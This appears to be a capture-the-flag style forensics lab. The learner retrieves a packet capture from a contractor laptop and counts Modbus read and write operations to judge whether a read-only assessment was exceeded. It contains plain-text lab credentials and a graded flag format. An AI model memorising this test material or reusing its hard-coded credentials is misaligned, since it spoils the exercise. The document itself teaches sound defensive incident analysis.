Ben Ortiz, the Plant 1 controls technician, arrived at 06:30 to start his shift and found a contractor's laptop still plugged into switch port 17 in the operations closet. The contractor, Dale Kowalski from Pulso Integration LLC, was supposed to run a read-only assessment overnight. The operations switch mirrors port 17 to a monitoring port, so Ben already has a full packet capture of Dale's session waiting on the seized laptop. Ben wants to know whether Dale stayed read-only, and Reyna Alvarado wants it in writing before the quarterly review.

Ben handed you the laptop still running. You have SSH access as the contractor user, and the capture file contractor_session.pcap sits in the contractor home directory:

Credentials in scope Username Password Where it is used Contractor laptop contractor ctr_temp_2026 SSH into the seized laptop to retrieve the capture Plant 1 HMI plant_op masa_op_2025 Reference only; not used in this exercise

docs.title: Why this matters
docs.text:
Two numbers drive the entire incident response. The count of Modbus read operations and the count of Modbus write operations in the capture are the triage data that decide which playbook Masa activates, and that decision has legal, contractual, and safety implications:

  • Zero writes, low reads. The incident is a "contractor left laptop plugged in overnight" policy violation. Reyna writes a memo to Pulso Integration reminding them to sign out after hours, Ben disables the operations switch port with an idle timer, and the quarterly report notes the vendor management gap. No PLC state was changed, no process integrity question, no safety review. Total handling cost: one afternoon.
  • A handful of writes inside a documented change window. The incident is a scope violation. Dale tested writability without a signed change ticket, which violates the vendor access agreement. Reyna opens a conversation with Pulso Integration about contract compliance and asks for a root-cause writeup. The plant runs a sanity check on the oven setpoint register but the historian shows everything returned to baseline, so no physical restart is needed. Total handling cost: a week of paperwork.
  • Dozens of writes, or writes on registers unrelated to the stated scope. The incident escalates to a possible active compromise. The contractor's credentials may have been stolen; the laptop may have been accessed by someone else; the operator on the wire may not be Dale at all. Reyna activates the full incident response playbook, calls the shift supervisor to verify no operational anomalies, pulls plc1 offline into maintenance mode, and engages Masa's insurance carrier because an OT incident with unauthorized writes is a reportable event. Total handling cost: weeks of investigation plus possible production downtime.

You do not know which of the three playbooks fires until you read the capture. That is why the two numbers exist as a flag: they are the go/no-go signal that determines whether Reyna goes home at 18:00 or camps in the control room through the weekend.

Your job is to open the capture Dale left behind, count the Modbus reads and writes, and submit them in the flag format below.

The flag follows the format OCR{ctr_<N>reads_<M>writes_plant1} where N is the number of Modbus read operations in the capture and M is the number of write operations. You count both yourself in Wireshark.

The Plant 1 stack (plc1.masa.local, mixer.masa.local, historian.masa.local) is also reachable from your Kali. You do not need to touch the PLCs to complete this exercise, but you can use them to corroborate the evidence if you want to practice read-only technique.

Use only Modbus function code 3 (read holding registers), function code 1 (read coils), and function code 4 (read input registers) on the PLCs. Any write function code is out of scope.

docs.title: Objectives
docs.text:
• SSH into the contractor laptop as the contractor user and retrieve contractor_session.pcap
  • Open the capture in Wireshark and isolate the Modbus traffic
  • Count every Modbus read operation and every Modbus write operation by function code
  • Corroborate the findings with the contractor's notes and assessment files
  • Compose the flag from the read count and write count
Detail Value Difficulty Intermediate (independent) Estimated Time 30 to 45 minutes Prerequisites Exercise 2.1 Flag Source Found? OCR{ctr_<N>reads_<M>writes_plant1} Composed from Modbus read/write counts in the capture

docs.title: Background: Modbus Function Codes on the Wire
docs.text:
Every Modbus/TCP request carries a single-byte function code that says exactly what the client asked the PLC to do. Wireshark decodes that byte and labels it for you in the Modbus tree, so you never have to read raw hex. The split between read and write is the entire case in this exercise:

Function code Operation Read or Write Wireshark filter 1 Read Coils Read modbus.func_code == 1 2 Read Discrete Inputs Read modbus.func_code == 2 3 Read Holding Registers Read modbus.func_code == 3 4 Read Input Registers Read modbus.func_code == 4 5 Write Single Coil Write modbus.func_code == 5 6 Write Single Register Write modbus.func_code == 6 15 Write Multiple Coils Write modbus.func_code == 15 16 Write Multiple Registers Write modbus.func_code == 16

For Dale's overnight session the reads are Function Code 3 (Read Holding Registers) and the writes are Function Code 6 (Write Single Register) and Function Code 16 (Write Multiple Registers). The display filters you will use are therefore modbus.func_code == 3 for the reads and modbus.func_code == 6 or modbus.func_code == 16 for the writes.

Count queries, not responses

Every Modbus request gets a response, and the response carries the same function code as the request. If you count both directions you will double every operation. Filter to one direction (the contractor's IP as the source, or the PLC's IP as the destination) before you count, so each operation is counted once. Wireshark labels request packets Query and response packets Response in the Info column.

docs.title: Tools You Will Need
docs.text: Tool Purpose Check ssh, sshpass Pull the capture off the seized laptop which ssh Wireshark Open the .pcap, filter Modbus, and count reads and writes in the GUI wireshark --version tshark Scriptable alternative for counting the same packets from the shell tshark --version cat Read the contractor's plaintext notes and assessment files which cat

docs.title: Suggested Methodology
docs.text: You build the two counts with tools, not scripts. Stage 1 retrieves the capture. Stage 2 opens it in Wireshark and isolates Modbus. Stages 3 and 4 count the reads and the writes by display filter. Stage 5 cross-references the contractor's own notes. Stage 6 records the counts and assembles the flag.

docs.title: Stage 1: Retrieve the Capture from the Laptop
docs.text:
SSH into the seized laptop and confirm the three evidence files are present, then copy the capture back to your Kali so you can open it in Wireshark locally.

Kali

sshpass -p 'ctr_temp_2026' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null contractor@ctr-laptop.masa.local 'ls -la ~'
Expected output 

total 36
drwxr-sr-x    1 contract contract      4096 Apr 11 23:00 .
drwxr-xr-x    1 root     root          4096 Apr 11 23:00 ..
-rw-r--r--    1 contract contract       ... Apr 11 23:00 assessment.txt
-rw-r--r--    1 contract contract       ... Apr 11 23:00 contractor_session.pcap
-rw-r--r--    1 contract contract       ... Apr 11 23:00 notes.txt
The laptop has three files in the contractor home: the packet capture, the notes, and the draft assessment.

Pull the capture down to your Kali with scp:

Kali

sshpass -p 'ctr_temp_2026' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null contractor@ctr-laptop.masa.local:~/contractor_session.pcap /tmp/contractor_session.pcap

docs.title: Stage 2: Open the Capture and Isolate Modbus
docs.text:
Open the file in the Wireshark GUI and narrow the view to the Modbus traffic.

  1. Open the capture. From a terminal run wireshark /tmp/contractor_session.pcap &, or inside Wireshark choose File > Open and select /tmp/contractor_session.pcap.
  2. Filter to Modbus. In the display filter bar (the wide bar directly under the toolbar), type modbus and press Enter. The packet list narrows to just the contractor's Modbus queries and the PLC responses.
  3. Read the function codes. Click any query row in the Packet List (top pane), then in the Packet Details (middle pane) expand the Modbus node. The Function Code field names the operation in plain text (for example Function Code: 3, Read Holding Registers). Walk a few packets so you recognize the read and write labels on sight.

docs.title: Stage 3: Count the Read Operations
docs.text:
Set the display filter to the read function code, restrict it to the contractor's queries so responses are not double-counted, and read the count off the status bar.

  1. In the display filter bar type modbus.func_code == 3 and press Enter. To count only the contractor's queries, append his source address, for example modbus.func_code == 3 && ip.src == <contractor-ip> (read the contractor IP from the source column of any query packet).
  2. Read the count from the status bar at the bottom right of the window. The Displayed number is the read operation count.
  3. As a cross-check, open Statistics > Conversations, select the TCP tab, and confirm the contractor-to-PLC conversations on port 502 line up with what the filter showed.

(tshark option)

You can produce the same read count from the shell: 

tshark -r /tmp/contractor_session.pcap -Y 'modbus.func_code == 3 && modbus.request_frame' 2>/dev/null | wc -l
Filtering on modbus.request_frame keeps responses out of the count automatically, so each read is counted once.

docs.title: Stage 4: Count the Write Operations
docs.text:
Repeat the count with the write function codes.

  1. In the display filter bar type modbus.func_code == 6 or modbus.func_code == 16 and press Enter. Restrict to the contractor's queries the same way if you want, for example (modbus.func_code == 6 or modbus.func_code == 16) && ip.src == <contractor-ip>.
  2. Read the Displayed count from the status bar. That is the write operation count.
  3. Click each write query and expand the Modbus tree to confirm the function code and the register address. Note which registers Dale wrote to; you will corroborate them against his notes in Stage 5.

(tshark option)

The shell equivalent for the write count: 

tshark -r /tmp/contractor_session.pcap -Y '(modbus.func_code == 6 || modbus.func_code == 16) && modbus.request_frame' 2>/dev/null | wc -l

docs.title: Stage 5: Cross-Reference the Notes
docs.text:
Confirm your write count against Dale's own words. The notes and assessment are plaintext on the laptop.

Kali

sshpass -p 'ctr_temp_2026' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null contractor@ctr-laptop.masa.local 'cat notes.txt; echo ---; cat assessment.txt'
Expected output (trimmed) 

...
I ended up bumping the oven setpoint a couple of times (up then back to
baseline) to verify the register was writable. I know that technically
counts as a write on an OT network. I will log it in the assessment and
call Reyna first thing in the morning.
---
Writes performed against plc1:
- Oven setpoint bumped and returned to baseline.
...
Dale's own notes describe the oven-setpoint writes he performed. Match the registers named in the notes to the write queries you saw in Stage 4. If the capture shows more writes than the notes admit to, that gap is itself a finding worth flagging to Reyna.

docs.title: Stage 6: Record Your Findings and Compose the Flag
docs.text:
Fill in the table from your own Wireshark counts, then assemble the flag from the template. Substitute the read count for <N> and the write count for <M>.

Evidence summary:

Question Your value Read operations in the capture (modbus.func_code == 3) <N> Write operations in the capture (modbus.func_code == 6 or 16) <M> Registers Dale wrote to (from the Modbus tree) Writes Dale documented in notes.txt / assessment.txt

Flag template: OCR{ctr_<N>reads_<M>writes_plant1}

Replace <N> with your read count and <M> with your write count, then submit the assembled string in the OCR platform flag box. The platform tells you immediately whether the counts are correct, so the finished flag is not printed here.

docs.title: Output Interpretation
docs.text:
• The Modbus response carries the same function code as the request, so a naive modbus.func_code == 3 filter counts both the query and the reply. Restricting to the request direction (modbus.request_frame, or the contractor IP as source) is what makes the count match the number of operations Dale actually performed
  • Dale wrote the classic "contractor with read-only scope who ended up writing a little" story into his own notes. The pattern is a very common finding in real engagements. Contractors test writability "just to make sure" and the write is never approved in advance
  • The "bumped and returned to baseline" language in the assessment is the piece a quality-of-evidence review would flag: Dale returned the setpoint to the baseline, which is the right instinct, but he still issued write queries against an OT device without documented authorization

docs.title: Analysis Questions
docs.text:
1. Why is a SPAN-port packet capture so valuable during an incident investigation?

Reveal answer

A capture records the exact bytes that crossed the wire, in order, with timestamps, independent of anything the host claims it did. Unlike bash history or application logs, which a careful attacker can clear or forge, a switch-mirrored capture sits outside the attacker's reach. For OT protocols like Modbus it is decisive because the protocol is unauthenticated and unencrypted: every function code, register address, and value is in plaintext on the wire, so the capture tells you exactly what was read and what was written without trusting the operator's account of events.

2. Dale's capture shows a Write Single Register to the oven setpoint followed immediately by a second write returning it to baseline. What does that pattern tell you about his intent?

Reveal answer

It tells you that Dale was testing writability, not trying to sabotage the plant. He wrote a new value, presumably read it back to confirm the write succeeded, then wrote the baseline value back immediately. That is the "test, verify, revert" pattern that contractors use to prove a register is writable without leaving the process in a modified state. The problem is not intent; the problem is that he did it without prior documented approval and without a maintenance window from operations.

3. The flag format requires both counts. What would a defender do differently if the capture showed reads and zero writes?

Reveal answer

The incident closes with a note that the read-only scope was honored. The laptop still sits overnight on an OT segment, which is its own policy violation, but the integrity of the PLC is intact and no maintenance-window notification is required. The writes are what turns the incident from "contractor left laptop plugged in" into "contractor wrote to a PLC outside of a maintenance window."

4. How would you monitor for a repeat of this incident in production?

Reveal answer

Three layers: a Modbus-aware IDS that alerts on any write function code from a source outside the HMI subnet (you drafted one of these in Exercise 3.4); a process to disable idle operations switch ports after a fixed period; and a vendor-access policy that requires contractor laptops to use a checked-out plant-owned device with a supervised network connection during the maintenance window only. None of these are free, but all three are cheaper than reviewing incident captures after the fact.

docs.title: Defensive Recommendations to Masa
docs.text: Finding Risk Mitigation Contractor laptop left plugged into operations VLAN overnight Critical Disable operations switch ports after 30 minutes of no activity, require sign-out on the vendor management log Contractor wrote to plc1 outside of a documented maintenance window High Deploy a Modbus-aware IDS with write alerting from non-HMI sources; require vendor write operations to be ticketed in advance No always-on packet capture on the operations VLAN Low Keep a rolling SPAN-port capture so every OT session is reconstructable after the fact, the way this incident was No vendor access policy differentiates "scope: read" from "scope: read and test writability" Medium Update vendor access templates so "test writability" requires an explicit change ticket

docs.title: Key Takeaways
docs.text:
• A SPAN-port packet capture is the highest-fidelity forensic artifact on an OT segment because Modbus is plaintext and the capture sits outside the attacker's reach
  • Wireshark decodes the Modbus function code and labels read versus write for you; the modbus.func_code display filter plus the status bar count is the cheapest way to tally operations
  • Always filter to the request direction (modbus.request_frame) before counting, or the query-and-response pairing doubles every operation
  • Contractors almost always "just test" writability even when they are scoped read-only. Plan your defenses around that reality
  • The flag format (explicit counts in the flag string) forces you to do the counting yourself in the analyzer, which is the skill the exercise is actually teaching
